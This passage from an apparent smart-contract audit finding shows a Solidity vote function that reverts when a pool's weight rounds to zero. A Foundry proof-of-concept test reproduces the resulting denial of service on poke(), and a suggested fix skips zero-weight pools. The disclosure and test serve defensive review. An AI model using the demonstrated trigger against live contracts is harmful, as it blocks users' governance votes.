        uint256 _usedWeight = 0;
        for (uint i = 0; i < _poolCnt; i++) {
            if (gaugeManager.isGaugeAliveForPool(_poolVote[i])) _totalVoteWeight += _weights[i];
        }
        for (uint256 i = 0; i < _poolCnt; i++) {
            address _pool = _poolVote[i];
            if (gaugeManager.isGaugeAliveForPool(_pool)) {
                uint256 _poolWeight = _weights[i] * _weight / _totalVoteWeight;
                require(votes[_tokenId][_pool] == 0, "ZV");
                require(_poolWeight != 0, "ZV"); // rounding-to-zero DoS here
                poolVote[_tokenId].push(_pool);
                weights[_pool] += _poolWeight;
                votes[_tokenId][_pool] = _poolWeight;
                IBribe(gaugeManager.fetchInternalBribeFromPool(_pool)).deposit(_poolWeight, _tokenId);
                IBribe(gaugeManager.fetchExternalBribeFromPool(_pool)).deposit(_poolWeight, _tokenId);
                _usedWeight += _poolWeight;
            }
        }
        if (_usedWeight > 0) IVELike(_ve).voting(_tokenId);
        totalWeight += _usedWeight;
        usedWeights[_tokenId] = _usedWeight;
    }
}

contract RoundingZeroDoS_Test is Test {
    MockVE ve;
    MockGaugeManager gm;
    MockBribe br;
    VoterUnderTest voter;

    function setUp() public {
        ve = new MockVE(); ve.setToken(address(0xDEAD));
        gm = new MockGaugeManager(); br = new MockBribe(); gm.setBribe(address(br));
        voter = new VoterUnderTest();
        voter.initialize(address(ve), address(gm));
        vm.warp(2200); // epochVoteStart(2200)=2100, so voting window is open
    }

    function test_RoundingToZero_DoS_onPoke() public {
        uint256 tokenId = 1;
        address[] memory pools = new address[](10);
        uint256[] memory w = new uint256[](10);
        for (uint i=0; i<10; i++) { pools[i] = address(uint160(1000 + i)); gm.setAlive(pools[i], true); w[i] = 1; }
        ve.setBalance(10);
        voter.vote(tokenId, pools, w); // each gets 1
        ve.setBalance(3);
        vm.warp(2600); // still within voting window for current epoch
        vm.expectRevert(bytes("ZV")); // revert reason string is "ZV"
        voter.poke(tokenId);
    }
}


## Suggested Mitigation
In _vote, do not revert on zero-weight allocations; instead, skip them and only add non-zero entries. After the loop, if no non-zero weights were assigned (_usedWeight == 0), explicitly clear the voted flag to avoid leaving the NFT in a voted-but-zero state. Concretely:
- Replace require(_poolWeight != 0, "ZV") with: if (_poolWeight == 0) { continue; }
- After the loop: if (_usedWeight > 0) IVotingEscrow(_ve).voting(_tokenId); else IVotingEscrow(_ve).abstain(_tokenId);
This avoids epoch-long DoS while preserving invariants (usedWeights equals sum of per-pool votes, and usedWeights <= veBalance). Optionally, cap the number of pools by current veBalance or drop the smallest fractional allocations until all surviving pools receive at least 1 unit; however, the simple skip-and-abstain approach fully removes the DoS without complex rounding logic.



